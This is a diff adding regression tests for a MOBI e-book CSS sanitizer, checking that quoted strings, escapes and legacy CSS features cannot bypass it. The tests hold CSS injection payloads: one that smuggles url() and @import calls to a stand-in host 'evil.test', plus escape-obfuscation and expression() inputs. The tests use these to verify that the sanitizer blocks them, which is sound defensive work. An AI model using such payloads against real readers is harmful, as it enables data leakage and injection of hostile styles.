@@ -188,3 +188,55 @@ describe('MOBI CSS 固定净化器包装层', () => {
     await expect(sanitizeMobiCss('', deny, 'yes' as unknown as boolean)).rejects.toThrow(/invalid arguments/);
   });
 });
+
+describe('引号哨兵修复的定向安全回归', () => {
+  it('恢复只产生原有惰性字符串，碰撞文本与URL/import不被替换，重复净化稳定', async () => {
+    const payload = '";background:url(https://evil.test/leak);@import "https://evil.test/evil.css";content:"';
+    const source = `@import "judu-safe-literal-0.css" layer(book) screen;
+      p{content:${JSON.stringify(payload)};quotes:${JSON.stringify('"')} ${JSON.stringify("'")};
+      font-family:${JSON.stringify('Book "Q"')};background:url(judu-safe-literal-0.png)}
+      q{content:"judu-safe-literal-0";font-family:"judu-safe-literal-x0"}`;
+    const resolve = vi.fn(async (value: string) => value.startsWith('mobi-resource-v1/') ? value : token(value));
+    const expected = canonical(source.replace('@import "judu-safe-literal-0.css"', `@import "${token('judu-safe-literal-0.css')}"`)
+      .replace('url(judu-safe-literal-0.png)', `url(${token('judu-safe-literal-0.png')})`));
+    // WHY：完整 AST 序列化结果必须等价；引号中的 URL/分号/import 不得成为活动语法或 resolver 请求。
+    const once = await sanitizeMobiCss(source, resolve);
+    expect(once).toBe(expected);
+    expect(await sanitizeMobiCss(once, resolve)).toBe(expected);
+    expect(resolve.mock.calls).toEqual([
+      ['judu-safe-literal-0.css', 'style'], ['judu-safe-literal-0.png', 'css'],
+      [token('judu-safe-literal-0.css'), 'style'], [token('judu-safe-literal-0.png'), 'css'],
+    ]);
+  });
+
+  it('合法直接String不能为URL、函数、import、标识符或控制字符转义开旁路', async () => {
+    const safe = String.raw`content:"safe \"quote\"";`;
+    const cases = [
+      `p{${safe}${String.raw`background:url("a\".png")`}}`,
+      `p{${safe}${String.raw`content:counter("name\"suffix")`}}`,
+      `p{${safe}${String.raw`font-family:local("Book \"Q\"")`}}`,
+      `${String.raw`@import "a\".css";`}p{${safe}}`,
+      `p{${safe}${String.raw`background:u\72l(a.png)`}}`,
+      String.raw`p{content:"hex \22 quote"}`,
+      `p{${safe}}\u0000`,
+    ];
+    for (const source of cases) {
+      const resolve = vi.fn(async (value: string) => token(value));
+      await expect(sanitizeMobiCss(source, resolve), source).rejects.toThrow(/escapes\/control/u);
+      expect(resolve).not.toHaveBeenCalled();
+    }
+  });
+
+  it('哨兵路径仍将整个CSS交给原净化器，危险函数/声明被移除而合法import条件保留', async () => {
+    const literal = JSON.stringify('safe "quote"');
+    const source = `@import "a.css" layer(book) supports(display:grid) print;
+      p{content:${literal};width:expression(evil());behavior:url(hidden.png);
+      background-image:image-set("hidden.png" 1x);background:url(visible.png);color:red}`;
+    const resolve = resolver({ 'style:a.css': token('a.css'), 'css:visible.png': token('visible.png') });
+    const output = await sanitizeMobiCss(source, resolve);
+    expect(output).toBe(canonical(`@import "${token('a.css')}" layer(book) supports(display:grid) print;
+      p{content:${literal};background:url(${token('visible.png')});color:red}`));
+    expect(resolve.mock.calls).toEqual([['a.css', 'style'], ['visible.png', 'css']]);
+    expect(output).not.toMatch(/expression|behavior|image-set|hidden\.png/u);
+  });
+});
